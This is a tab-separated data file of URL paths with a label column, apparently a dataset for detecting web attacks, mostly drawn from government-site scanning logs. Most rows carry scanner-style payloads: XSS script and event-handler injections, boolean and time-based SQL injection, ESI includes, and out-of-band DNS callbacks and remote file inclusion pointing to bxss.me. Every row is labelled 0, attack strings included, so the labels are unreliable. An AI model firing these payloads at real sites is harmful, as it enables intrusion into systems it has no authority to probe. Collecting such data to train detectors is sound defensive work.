sentences	labels
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/list.html?new='""()&%<acx><script >nuyr(9746)</script> 	 0
jsearchfront/********/jcse/110105008056111/http://bxss.me/t/fit.txt?.jpg/images/main.css 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(975)">?_=1630311675687 	 0
index/******/2020/01/23/javascript:window.print() 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 6376=6376 and ('1'='1 	 0
zwgk/****/bmyjs/zzqjcyxt/ycxjcy/\"javascript:void(0)\" 	 0
xxgk/*****/1088/1098/list.html?new='""()&%<acx><script >xg1h(9359)</script> 	 0
xxgk/******/whgdj/?id=4001%' or 2468=1350 and '%%'='% 	 0
newscenter/******/2021/08/19/013437157.shtmldata:image/svg xml,<svg width= 	 0
pic/***/10/50/21/10502106_867773.jpg 	 0
module/**********/visit.jsp?i_columnid=1&i_webid=if(now()=sysdate(),sleep(15),0)&type=1 	 0
swld/******/2021/10/11/javascript:window.print() 	 0
vc/**/widgets/hanweb/validity/validity"" and 2*3*8=6*8 and ""ptdl""=""ptdl.js 	 0
nul/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
jsearchfront/********/jcse/110105008056111/16/images'||'/plugin/selectpick/css.css 	 0
public/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 0
was5/***/search?channelid=299868%' or 6576=6576 and '%'='&perpage=1000 	 0
xxgk/******/tjj/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_2127/xwfbh_2065/list.html 	 0
index/******/2020/08/24/javascript:window.close(); 	 0
z/210514-'""()&%<acx><script >rsbr(9740)</script>/*****/93aa5449bf388d846409a3d11e199a08.css 	 0
xxgk/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 0
socket.gethostbyname('hitha' 'nofzfkuy3fc33.bxss.me.')[3].to_s) '/***************/16/images/result.css 	 0
qhly/******/2012/04/03/javascript:dozoom(12) 	 0
ddjs/*******/gvideos.php?gid=1 and 1=1 	 0
socket.gethostbyname('hitpu' 'drnhirnd62037.bxss.me.')[3].to_s) '/**/images/common.js 	 0
newscenter/****/javascript:void(); 	 0
xxgk/*****/1088/1098/list.html?new="".gethostbyname(lc(""hitip"".""vanutndf4143d.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(114).chr(88).chr(105).chr(83)."" 	 0
newscenter/******/2013/11/13/011232720.shtml 	 0
lcgg1/********/javascript:void(0); 	 0
lxwm/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 0
gjcp/****/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
qywh/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 0
xwdt' and 2*3*8=6*8 and 'r6sg'='r6sg/****/csjs/gzdt.htm 	 0
lz/******/count/0006000/000000000000/ 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 0688=0688 and '1'='1 	 0
zwgk'||'/*******/1.htm 	 0
/***********/5/top-footer.css 	 0
index/******/2020/06/04/javascript:window.close(); 	 0
news/********/guowaishichangzhunru?page=1' or 1601=1601 /* 	 0
xxgk/xxgkml'||'/*******/list.html 	 0
kjcx/****/fzzl/ 	 0
vc/**/lib'||'/security/sm2.js 	 0
jsearchfront/********/jcse'""()&%<acx><script >m5zd(9159)</script>/110105008056111/16/images/css.js 	 0
index/******/2013/04/16/011064145.shtml 	 0
2017zt/******/2019/11/25/javascript:window.print() 	 0
index/******/2019/11/01/javascript:window.close(); 	 0
if(now()=sysdate(),sleep(12),0)/****/gcjsbzgl/gcjybz/1.htm 	 0
was5/***/search?page=2&channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(30174)</script>&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
xwzx/bmkx<esi:include src=""http://*******/rpb.png""/>/ 	 0
jsearchfront/********/jcse/110105008056111/16/images/bxss.me.js 	 0
vc/**/lib"" and 2*3*8=6*8 and ""lzrx""=""lzrx/easyui/plugins/jquery.parser.js 	 0
lz/******/2021/10/30/javascript:void(0); 	 0
system/********/storage/localupload.jsp?doaction=save&rid=1rnott09fg' and 9682=9682 and '1'='1&uptoken=1ff87566684b40c688f756b86e2c3798 	 0
jsearchfront/********/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 0
wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=<script language='php'>echo 10516*61501;</script>&month=5&year=2018&day=1&pag=1 	 0
col"" and 2*3*8=6*8 and ""e66u""=""e66u/******/index.html 	 0
zwgk/******/gczlzl/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
xwzx/****/2020_zdgz/202108/t20210824_314976.html" and "x"="y 	 0
es/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
xwdt/****/if(now()=sysdate(),sleep(12),0)/gzdt/144.htm 	 0
xwzx/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 0
module/**********/visit.jsp?i_columnid=34&i_webid=1&type=2 and 1=1 	 0
xxgk/******/wsjkwyh/javascript:void(0) 	 0
hdjl//***********/202012/t20201225_2539623.html 	 0
col/******/index.html"" and ""x""=""y 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%' or 3467=3467  	 0
xwzx/*****/2021_qydt/202110/t20211012_318360.html" and "x"="x 	 0
index/******/2020/01/14/javascript:window.print() 	 0
xxgk/******/2012/'.gethostbyname(lc('hitue'.'rhrlekxf2732c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(80).chr(110).chr(76).'.html 	 0
index/******/2020/10/21/javascript:void(0); 	 0
was5/***/search/search?page=3&channelid=287219&searchword=1&keyword=1&orderby=-docreltime';select sleep(5) 	 0
jsearchfront/********/jcse/110105008056111<img src=x onerror=alert(5311)>/16/images/layer/layer.js 	 0
module/***/jpage/http://bxss.me/t/fit.txt/default/css/jpage.css 	 0
xwdt/if(now()=sysdate(),sleep(12),0)/****/gzdt.htm 	 0
jsearchfront/********/jcse/110105008056111/16//xfs.bxss.me/plugin/selectpick/js.js 	 0
zxgg/********/javascript:void(0); 	 0
system/********/js/newcalendar/wdatepicker' and 2*3*8=6*8 and 'siv0'='siv0.js 	 0
jsearchfront/********/http://bxss.me/t/fit.txt/110105008056111/16/images/ui.css 	 0
xxgk/'""()&%<acx><script >8fii(9702)</script>/****/list.html 	 0
xq/******/2020/10/14/javascript:void(0); 	 0
news/**************/denmark 	 0
fxgg/********/javascript:void(0); 	 0
search/********/index.jsp?locale=""><script>alert(777)</script> 	 0
module/**********/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1103019683')))>'0&i_columnid=15&i_webid=1&type=3 	 0
ywzzq/*****/edit.php?menu="">pt>alert(777); script>pt> 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(4642)</script>?_=1630312098691 	 0
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zws/znx/xmb_gzdxb.htm 	 0
xxgk/******/zdmsxx/list.html?new=0.30645946703217297'""()&%<acx><script >taj0(9089)</script> 	 0
synr/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 0
jsearchfront/********//xfs.bxss.me/110105008056111/16/images/result.css 	 0
qhly/******/2017/02/15/javascript:window.print() 	 0
cysd/******/2017/10/18/012443887.shtml 	 0
zwgk/****/bmyjs/qtdw/zzqnfb/\"javascript:void(0)\" 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 7925=9175  	 0
module/**********/visit.jsp?i_columnid=1&i_webid=1&type=1'and/**/extractvalue(1,concat(char(126),md5(1417582364)))and' 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin//xfs.bxss.me/criteria.js 	 0
wzdt/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 0
rlzy/****/pxdt/ 	 0
xwdt/****/zjdt' and 2*3*8=6*8 and 'qzgp'='qzgp/gzdt/1.htm 	 0
newscenter/******/2021/10/26/javascript:window.close(); 	 0
gjjtwzq/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
was5/***/search?channelid=299868&perpage=1000%' or 6620=6226  	 0
synr/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
zwgk/******/bzxajgc/szss' and 2*3*8=6*8 and 'n39j'='n39j/plx.htm 	 0
ztzl/****/qyddt/202003/t20200313_244054.html' and 'x'='y 	 0
module/**********/visit.jsp?i_columnid[1]==extractvalue(1,concat(char(126),md5(1270704909)))&i_columnid[0]=exp&i_webid=1&type=1 	 0
xxgk/******/fzlc/ 	 0
skin/**/jsencrypt' and 2*3*8=6*8 and 'ohc5'='ohc5/jsencrypt.min.js 	 0
zwgk/******/gytdsdfwzs' and 2*3*8=6*8 and 'vghy'='vghy/wzs/zcwj.htm 	 0
kjcx/****/202011/t20201125_256669.html" and "x"="y 	 0
ztpd/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
lxwm/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 0
qhly/******/2021/09/01'""/><img src=javascript:alert(1827) /013442863.shtml 	 0
art/****/11/20/art_5264_221965.html/<img src="javascript:alert(890)"> 	 0
zwgk/*****/5619/5628/index.html 	 0
video/wp-content/*******/nextgen-gallery/nggallery.php?test-head='"">alert(777); 	 0
vc/**/widgets/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/validity.js 	 0
newscenter/******/2021/06/30/javascript:void(0); 	 0
xq/******/2021/12/13/javascript:void(0); 	 0
system/********/code/datainput.jsp?owner=%') or 2438=2438 and '%'=' 	 0
images/***/layout.js/"><script>alert(7671)</script> 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 8459=4076  	 0
synr/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 0
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/jsencrypt/jsencrypt.min.js 	 0
jsearchfront/********/jcse/110105008056111/16/images<esi:include src=""http://bxss.me/rpb.png""/>/condition.js 	 0
jsearchfront/template'||'/****/110105008056111/16/images/hanweb.css 	 0
news/********/silumaoyi?page=1 and 8369=8369-- 	 0
vc/**/widgets/cookie/http://bxss.me/t/xss.html? 	 0
skin/js' and 2*3*8=6*8 and 'qxoq'='qxoq/*******/jbase64.js 	 0
ywly/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
qhsw/******/2021/04/22'""/>%uff1cscript%uff1ealert%uff082391%uff09%uff1c/script%uff1e/013373702.shtml 	 0
e/******/viewclick/?addclick=0""xor(if(now()=sysdate(),sleep(6),0))xor""z&classid=132&id=270 	 0
index/******/2021/12/16/javascript:void(); 	 0
lcgg1/********/javascript:void(0); 	 0
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') or 0796=0796 and '%'=' 	 0
news/********/yuanquzhaoshang?page=1</script><script>j10g(9529)</script> 	 0
gjcp/***/sa3/addholiday.do 	 0
qt/****/ 	 0
pic/*/01/41/03/1410398_388057.jpg 	 0
vc"" and 2*3*8=6*8 and ""nkae""=""nkae/**/lib/jquery/jquery.min.js 	 0
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/easyui/plugins/jquery.linkbutton.js 	 0
xxgk/*****/1088/1103/list.html?new='""()&%<acx><script >thmh(9204)</script> 	 0
shzr/******/common/signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 0
nul/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 0
vc/**/widgets/validity/validity%' and 2*3*8=6*8 and 'tnox'!='tnox%.js 	 0
zwgk/****/bmyjs/rmtt/wl/201602/encodeuricomponent(window.location.href) 	 0
was5/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 0
com1/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 0
was5/***/search?perpage=20; waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10 	 0
gygj/****/zggj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
images/*/language.js/""><script>alert(7545)</script> 	 0
xxgk/*****/1079/"".gethostbyname(lc(""hitjs"".""lhyqpdtt7d862.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(90).chr(108).chr(84).""/list.html 	 0
sample.php?theme=<script>alert(/***********/)</script> 	 0
dss/***/_log/access.log 	 0
2021zt/******/2021/09/08/javascript:void(); 	 0
ru/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1) and 0084=0084#&token=1 	 0
socket.gethostbyname(""hitpc"" ""bnayqclb6daa5.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/css.js 	 0
module/*****/grouppic/http://bxss.me/t/fit.txt?.ad-gallery.js 	 0
vc/**/css' and 2*3*8=6*8 and 'bf4i'='bf4i/page.css 	 0
xxgk/******/zfczyjs//xfs.bxss.me.html 	 0
lcgg/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
en/***********/rdandmanufacture/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
index/******/2009/07/16/002775320.shtml 	 0
qhly/******/2017/02/15/javascript:window.close(); 	 0
xxgk/******/tjj/zfxxgkml_2127/hygq_2064'""()&%<acx><script >khwe(9547)</script>/list.html 	 0
was5/***/search?searchword=1%') or 6110=6110  	 0
gygj/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 0
vc/**/lib/easyui/plugins' and 2*3*8=6*8 and 'qvco'='qvco/jquery.linkbutton.js 	 0
public/*****/edit.php?menu="">pt>alert(777); script>pt> 	 0
hdjl/****/wjdc' and 2*3*8=6*8 and '6chc'='6chc.htm 	 0
was5/***/search?channelid=234439') and 5159=5159  	 0
col/*****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.html 	 0
jsearchfront/**********/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=if(now()=sysdate(),sleep(15),0)&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 	 0
xxgk/*****/1088/1110/list.html?new='""()&%<acx><script >pafm(9942)</script> 	 0
qhly/******/2015/12/22/javascript:dozoom(14) 	 0
xinanyanjiu' and 2*3*8=6*8 and 'inc6'='inc6/************/guzhiqihuo/index_9.html 	 0
images/*/layout.js/<img src="javascript:alert(496)"> 	 0
xxgk/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/zfxxgkml_2127/jytabljg_2061/list.html 	 0
socket.gethostbyname(""hitzk"" ""adjmyrmhaa66a.bxss.me."")[3].to_s) ""/*/xys.css 	 0
gygj/****/gjjj/" and "x"="y 	 0
qhly/******/2017/02/15/javascript:dozoom(14) 	 0
index/******/2019/04/30/javascript:void(0); 	 0
rlzy/****/202010/t20201009_254278.html and 1>1 	 0
images/*/layout.js/"><script>alert(497)</script> 	 0
zwgk/******/ncwywfgz/ycs/hlx' and 2*3*8=6*8 and '5anf'='5anf/xmb_gzdxb.htm 	 0
zwgk/****/bmyjs/zzqfyxt/lwsrmfy/\"javascript:void(0)\" 	 0
2020zt/******/2020/09/21/javascript:void(0); 	 0
xxgk/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
module/********/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx' and 5309=5309 and 'ajst'='ajst 	 0
ztzl%' and 2*3*8=6*8 and 'hc9m'!='hc9m%/******/zcwj/1.htm 	 0
socket.gethostbyname(""hitwo"" ""kfxjlwrtb09d0.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/main.css 	 0
zwgk/******/if(now()=sysdate(),sleep(12),0).htm 	 0
web/********/fonts/fontawesome-webfont.ttf?v="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""// 	 0
socket.gethostbyname('hitqp' 'tgqlreona377f.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 0
xxgk/******/201810/t20181031_194422.html and 1=1 	 0
jsearchfront/********/jcse/110105008056111/16/images/searchbtn.js/"><script>alert(4664)</script> 	 0
en/***********/news/" and "x"="y 	 0
jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js 	 0
e/******/showinfo/?classid=0'xor(if(now()=sysdate(),sleep(22),0))xor'z&id=10299 	 0
swld/******/2021/06/07/javascript:window.print() 	 0
infogate/********/style/;<script/acu src=//xss.bxss.me/t/xss.js?9278></script> 	 0
css/*******/diary/new/submit.php 	 0
news/********/fengxianfangfan?page=1 and 3631=3631 	 0
module/********/downfile.jsp?classid=0&filename=75a45d85bd6c4a2d8c6e0c9614767fef.doc and 7626=7626-- ekvc 	 0
zwgk/zdlygk%' and 2*3*8=6*8 and 'xje6'!='xje6%/******/1.htm 	 0
images/*********/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
module/***/jpage/'""()&%<acx><script >evhi(9822)</script>/default/css/jpage.css 	 0
system/********/code/datainput.jsp?owner=') and 2533=2533  	 0
ldzc/http://*******/t/fit.txt?.jpg/201610/t20161016_531.html 	 0
dqgg/********/javascript:void(0); 	 0
0'xor(if(now()=sysdate(),sleep(18),0))xor'z/**********/graphic/2020-02-27/8981.html 	 0
was5/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 0
was5/***/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 0
gjcp/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 0
jsearchfront/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1<esi:include src=""http://*******/rpb.png""/>&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 0
ztsj/**/yqfkzccs/dsjzccs/gyszc/\"javascript:void(0)\" 	 0
2021zt/****/"><script>alert(189)</script> 	 0
swld/******/2021/06/27/javascript:window.print() 	 0
xwzx/****/2021_mtgz/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/t20210505_273338.html 	 0
xwzx//***********/sgaj/ 	 0
jsearchfront/template'""()&%<acx><script >vpin(9140)</script>/****/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 0
news/********/jishuchuangxin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 0
prn/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 0
xwdt' and 2*3*8=6*8 and 'm9u8'='m9u8/****/ghby/gzdt.htm 	 0
lz/******/count/0006008/000000000000/window.location.href 	 0
zmhd/*****/hfswsj/http://bxss.me/t/fit.txt?.jpg.html 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1') and 9822=9822  	 0
fr/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
ldzc/*****/202109/t20210924_186864.html?leader='""()&%<acx><script >smnz(9771)</script> 	 0
icons/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 0
module/**********/visit.jsp?i_articleid=233296&i_columnid=33&i_webid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&type=3 	 0
'""()&%<acx><script >8fii(9120)</script>/******/2014/list.html 	 0
socket.gethostbyname(""hitem"" ""kvfaqpsy44544.bxss.me."")[3].to_s) ""/*********/linkbutton.css 	 0
system/********/if(now()=sysdate(),sleep(12),0)/centercutimg.js 	 0
z'""()&%<acx><script >br7s(9741)</script>/191211-8/*****/d7c921b2c59d284228d4f6d2d18d0cae.css 	 0
index/******/2021/12/21/javascript:window.close(); 	 0
n42790/******/n42792/c1649472/content'||'.html 	 0
zwgk/******/gytdsdfwzs%' and 2*3*8=6*8 and '7j7e'!='7j7e%/zzq/zcwj.htm 	 0
was5/***/sources?resource=alert(/777/)&format=txt 	 0
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/'""()&%<acx><script >covi(9370)</script>.html 	 0
system' and 2*3*8=6*8 and 'yyjb'='yyjb/********/js/formfunc.js 	 0
z/******/index/3494307764'""()&%<acx><script >gn73(9815)</script>da7f36733716be7abc7a9b.js 	 0
wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=<script language='php'>echo 10516*61501;</script>&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=2018 	 0
en/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
system/********/js/northwind/ 	 0
xxgk/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
skin/**/encrypt/md5.js;;";;alert(300);;s=" 	 0
xinanyanjiu/*************/2017-02-16/288.html 	 0
zwgk/******/ncwywfgz/wzs' and 2*3*8=6*8 and 'hpkv'='hpkv/ltq/xmb_gzdxb.htm 	 0
ztpd/******/count/0036003/000000000000/window.location.href 	 0
ztpd/******/common/newaccount.aspx?btncancel=alert(777) 	 0
xfe/*********/*/-->'""></iframe></script></style></title></textarea><script >alert(90958)</script> 	 0
module/**********/visit.jsp?type=3&i_webid=1&i_columnid=392&i_articleid=192567 	 0
ztzl/******/djbn_zypl/ 	 0
ywly/****/jcgc/ 	 0
z'""()&%<acx><script >he7f(9327)</script>/******/index/d7c921b2c59d284228d4f6d2d18d0cae.css 	 0
2016zt/******/2021/11/15/javascript:void(0); 	 0
col/****/index.html"" and ""x""=""y 	 0
xwzx/****/gjmyt/ and 1=1 	 0
newscenter/******/more/253000000000000/0002/javascript:void(); 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(4644)</script>?_=1630312093914 	 0
xxgk/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 0
english/*******/sight/index.shtml/<img src="javascript:alert(88)"> 	 0
module/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/jquery.js 	 0
qywh/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 0
was5/***/search?channelid=234439') and 6154=3039 and ('1'='1&orderby=relevance&perpage=24&searchword=1 	 0
zwgk/******/ncwywfgz' and 2*3*8=6*8 and '69mn'='69mn/ycs/lws/xmb_gzdxb.htm 	 0
prn/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
system/********/js/news/video/mp4/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid'""()&%<acx><script >vpin(9560)</script>.js 	 0
zwgk/****/bmjs/zzqjcyxt/qtxsjcy/\"javascript:void(0)\" 	 0
index/******/2019/05/15/javascript:window.print() 	 0
zwgk/******/ncwywfgz'||'/zws/yzq/xmb_gzdxb.htm 	 0
u6ca1/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
module/**********/visit.jsp/"><script>alert(2082)</script>?type=3&i_webid=1&i_columnid=392&i_articleid=192569 	 0
vc<esi:include src=""http://*******/rpb.png""/>/ui/lib/easyui/plugins/jquery.window.js 	 0
module/**********/visit.jsp?i_columnid=1&i_webid[0]==2and 3 in &i_webid[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1192476309')))>'0&type=1 	 0
col/****/index.html"" and ""x""=""y 	 0
nul/****/gallery1.php?g_name=<script>alert(77729</script> 	 0
was5/***/search?channelid=299868%' and 0301=0301 and '%%'='%&perpage=1000 	 0
rssdy/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 0
jsearchfront/********/jcse/website'||'.js 	 0
module/********/downfile.jsp?filename=1b0848360b3c411a9c69b356cf0165e0.doc&classid=0%'and(0)='0'and'%'=' 	 0
news/********/pinpaijianshe?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(46891)</script> 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/criteria//xfs.bxss.me.js 	 0
xinanyanjiu/***********/2021-09-02/javascript:void(0) 	 0
newscenter/******/2021/11/12/javascript:void(); 	 0
zwgk/****/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj/\"javascript:void(0)\" 	 0
xwzx/****/mt17_6390/ 	 0
2020zt/******/2020/10/12/javascript:void(0); 	 0
vc/**/interface/visit.jsp?i_articleid=0&i_columnid=36&i_webid=1&type=2&url=0'xor(if(now()=sysdate(),sleep(15),0))xor'z 	 0
ywzzq/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
tencent:/*******/tencent:/*******/tencent:/*******/tencent:/*******/tencent:/*******/?uin=1969854010' or (1=2) and 'a'='a&site=&menu=yes 	 0
xxgk/"".gethostbyname(lc(""hityq"".""fkkmhlgo6dd4c.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(101).chr(69).chr(118).chr(71).""/****/list.html 	 0
2021zt/******/2021/03/04/javascript:window.close(); 	 0
_dwr/*********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js 	 0
socket.gethostbyname('hityh' 'msasboncb276e.bxss.me.')[3].to_s) '/*******/jquery.parser.js 	 0
bdt/******/2009/06/10/002755179.shtml 	 0
images/*****/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user 	 0
jsearchfront/**********/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=&q=if(now()=sysdate(),sleep(15),0)&searchid=44&tpl=16&websiteid=110105008056111 	 0
z/210909-2/*****/'""()&%<acx><script >9hvh(9696)</script>.css 	 0
template/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 0
css/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 0
xxgk/******/tjj/zfxxgkml_2127/lzyj/bmwj/list.html?new=bxss.me 	 0
fr/****/xwygx/202109/t20210918_316950.html 	 0
xwzx/****/2021_mtgz/202103/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_271326.html 	 0
xwzx/****/2021_mtgz/202107/ 	 0
newscenter/******/2021/12/06/javascript:window.close(); 	 0
ywly/*****/index.html?continent=%' or 8943=8943 and '%%'='% 	 0
system/********/storage/uploadresult.jsp?token=1ff87566684b40c688f756b86e2c3798 	 0
news/********/zhengcegoutong?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(94582)</script> 	 0
vc/**/lib/easyui"" and 2*3*8=6*8 and ""upht""=""upht/plugins/jquery.draggable.js 	 0
xxgk/******/tjj/zfxxgkml_2127/hygq_2064<esi:include src=""http://bxss.me/rpb.png""/>/list.html 	 0
socket.gethostbyname(""hitlm"" ""sycvkumk52fef.bxss.me."")[3].to_s) ""/**/lib/security/sm2.js 	 0
socket.gethostbyname('hitib' 'bfbfapmab2330.bxss.me.')[3].to_s) '/***************/16/images/autocomplete.css 	 0
